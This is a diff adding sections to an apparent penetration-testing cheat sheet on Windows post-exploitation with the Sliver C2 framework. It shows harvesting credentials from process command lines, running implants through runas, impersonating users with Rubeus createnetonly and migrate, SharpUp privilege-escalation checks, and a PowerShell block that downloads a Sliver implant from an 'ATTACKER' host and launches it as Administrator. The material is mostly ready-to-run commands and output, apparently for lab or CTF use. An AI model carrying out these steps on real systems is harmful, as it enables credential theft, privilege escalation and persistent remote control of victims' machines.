@@ -276,6 +276,111 @@ portfwd
 portfwd rm -i 2
 ```
 
+### Process Enumeration with Command Line
+
+Use `ps -c -f` to see full command lines of running processes. This is critical for finding credentials passed as arguments.
+
+```bash
+# Show all processes with full command line
+ps -c -f
+
+# Filter for specific process
+ps -e "firefox.exe" -c -f
+```
+
+**Example credential discovery:**
+
+```bash
+ps -c -f
+# Output showing credentials in command line:
+# 6624   SUPPORTDESK\Chase   C:\Program Files\Mozilla Firefox\firefox.exe : "C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+```
+
+### Sliver runas Command
+
+Run a process as a different user (requires valid credentials):
+
+```bash
+# Run sliver implant as Administrator
+runas -d . -u Administrator -P 'Password123!' -n -p C:\\Windows\\System32\\spool\\drivers\\color\\sliver.exe
+
+# Flags:
+# -d  Domain (use "." for local accounts)
+# -u  Username
+# -P  Password
+# -n  NetOnly logon (network credentials only)
+# -p  Path to executable
+```
+
+**Note:** `runas` may not give you a new session with the elevated user's token. For full impersonation, use `rubeus createnetonly` with `migrate`.
+
+### Rubeus createnetonly + Migrate
+
+For proper credential-based impersonation in Sliver:
+
+```bash
+# 1. Create a process with target user's network credentials
+rubeus -t 20 -- createnetonly /program:C:\\Windows\\System32\\notepad.exe /domain:. /username:Administrator /password:'Password123!'
+
+# Output:
+# [+] Process : 'C:\Windows\System32\notepad.exe' successfully created with LOGON_TYPE = 9
+# [+] ProcessID : 5852
+
+# 2. Migrate into the new process
+migrate -p 5852
+
+# 3. New session will be created with network access as target user
+```
+
+### SharpUp - Automated Priv Esc Checks
+
+GhostPack tool for finding privilege escalation paths.
+
+```bash
+sharpup audit
+
+# Example output:
+=== SharpUp: Running Privilege Escalation Checks ===
+Registry AutoLogon Found
+
+[!] Modifialbe scheduled tasks were not evaluated due to permissions.
+
+=== Registry AutoLogons ===
+        DefaultDomainName: .
+        DefaultUserName: Administrator
+        DefaultPassword:
+
+=== Unattended Install Files ===
+        C:\Windows\Panther\Unattend.xml
+```
+
+**What it checks:**
+- Modifiable services/binaries
+- AlwaysInstallElevated
+- Unattended install files
+- Registry AutoLogon credentials
+- Modifiable scheduled tasks
+- Cached GPP passwords
+
+### PowerShell Run Process as Different User
+
+When you have credentials but need to spawn a process as that user from a Sliver shell:
+
+```powershell
+# Get into a shell first
+shell -t 600
+
+# Create credential object
+$pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(".\Administrator", $pass)
+
+# Download and execute (e.g., new Sliver implant)
+(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8000/sliver2.exe', "$env:TEMP\sliver2.exe")
+Start-Process -Credential $Cred "$env:TEMP\sliver2.exe"
+
+# New session will appear as the target user
+```
+
 ### Sliver Windows Post Exploitation
 
 * good finds&#x20;
